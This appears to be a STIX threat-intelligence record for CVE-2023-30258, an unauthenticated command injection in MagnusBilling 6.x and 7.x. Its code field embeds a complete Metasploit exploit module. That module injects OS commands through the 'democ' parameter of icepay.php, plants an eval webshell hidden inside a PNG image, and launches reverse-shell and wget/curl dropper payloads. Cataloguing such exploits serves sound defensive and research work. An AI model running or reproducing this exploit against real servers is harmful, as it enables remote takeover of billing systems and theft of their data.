{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f45f034-919a-43da-ad97-cc1985766b20",
    "created": "2024-08-14T17:02:50.325758Z",
    "modified": "2024-08-14T17:02:50.325762Z",
    "name": "MagnusBilling application unauthenticated Remote Command Execution.",
    "description": " A Command Injection vulnerability in MagnusBilling application 6.x and 7.x allows remote attackers to run arbitrary commands via unauthenticated HTTP request. A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec(). The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and not properly sanitised/escaped. After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands. The commands run with the privileges of the web server process, typically `www-data` or `asterisk`. At a minimum, this allows an attacker to compromise the billing system and its database.  The following MagnusBilling applications are vulnerable: - MagnusBilling application version 6 (all versions); - MagnusBilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/magnusbilling_unauth_rce_cve_2023_30258.rb",
            "external_id": "magnusbilling_unauth_rce_cve_2023_30258.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-30258"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258"
        },
        {
            "source_name": "reference",
            "url": "https://eldstal.se/advisories/230327-magnusbilling.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Format::PhpPayloadPng\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MagnusBilling application unauthenticated Remote Command Execution.',\n        'Description' => %q{\n          A Command Injection vulnerability in MagnusBilling application 6.x and 7.x allows\n          remote attackers to run arbitrary commands via unauthenticated HTTP request.\n          A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec().\n          The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and\n          not properly sanitised/escaped.\n          After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands.\n          The commands run with the privileges of the web server process, typically `www-data` or `asterisk`.\n          At a minimum, this allows an attacker to compromise the billing system and its database.\n\n          The following MagnusBilling applications are vulnerable:\n          - MagnusBilling application version 6 (all versions);\n          - MagnusBilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor\n          'Eldstal' # Discovery of the vulnerability\n\n        ],\n        'References' => [\n          ['CVE', '2023-30258'],\n          ['URL', 'https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258'],\n          ['URL', 'https://eldstal.se/advisories/230327-magnusbilling.html']\n        ],\n        'DisclosureDate' => '2023-06-26',\n        'Platform' => ['php', 'unix', 'linux'],\n        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X64, ARCH_X86],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => ['php'],\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => ['unix', 'linux'],\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => ['linux'],\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['wget', 'curl', 'bourne', 'printf', 'echo'],\n              'Linemax' => 2048,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The MagnusBilling endpoint URL', '/mbilling' ]),\n      OptString.new('WEBSHELL', [\n        false, 'The name of the webshell with extension. Webshell name will be randomly generated if left unset.', nil\n      ], conditions: %w[TARGET == 0])\n    ])\n  end\n\n  def execute_command(cmd, _opts = {})\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'lib', 'icepay', 'icepay.php'),\n      'vars_get' =>\n        {\n          'democ' => \"/dev/null;#{cmd};#\"\n        }\n    })\n  end\n\n  def execute_php(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'lib', 'icepay', @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def upload_webshell\n    # randomize file name if option WEBSHELL is not set\n    @webshell_name = if datastore['WEBSHELL'].blank?\n                       \"#{Rex::Text.rand_text_alpha(8..16)}.php\"\n                     else\n                       datastore['WEBSHELL'].to_s\n                     end\n\n    @post_param = Rex::Text.rand_text_alphanumeric(1..8)\n\n    # inject PHP payload into the PLTE chunk of a PNG image to hide the payload\n    php_payload = \"<?php @eval(base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n    png_webshell = inject_php_payload_png(php_payload, injection_method: 'PLTE')\n    return nil if png_webshell.nil?\n\n    # encode webshell data, set write and execute permissions and write to file on the target for execution\n    payload = Base64.strict_encode64(png_webshell.to_s)\n    cmd = \"chmod 755 ./;echo #{payload}|base64 -d > ./#{@webshell_name}\"\n    execute_command(cmd)\n  end\n\n  def check\n    print_status(\"Checking if #{peer} can be exploited.\")\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'uri' => normalize_uri(target_uri.path)\n    })\n    # Check if target is a magnusbilling application\n    return CheckCode::Unknown('No response received from target.') unless res\n    return CheckCode::Safe('Likely not a magnusbilling application.') unless res.code == 200 && res.body =~ /MagnusBilling/i\n\n    # blind command injection using sleep command\n    sleep_time = rand(4..8)\n    print_status(\"Performing command injection test issuing a sleep command of #{sleep_time} seconds.\")\n    _res, elapsed_time = Rex::Stopwatch.elapsed_time do\n      execute_command(\"sleep #{sleep_time}\")\n    end\n    print_status(\"Elapsed time: #{elapsed_time.round(2)} seconds.\")\n    return CheckCode::Safe('Command injection test failed.') unless elapsed_time >= sleep_time\n\n    CheckCode::Vulnerable('Successfully tested command injection.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :php\n      res = upload_webshell\n      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200\n      register_file_for_cleanup(@webshell_name.to_s)\n      execute_php(payload.encoded)\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager({ linemax: target.opts['Linemax'] })\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-06-26",
    "x_mitre_platforms": [
        "['linux']"
    ]
}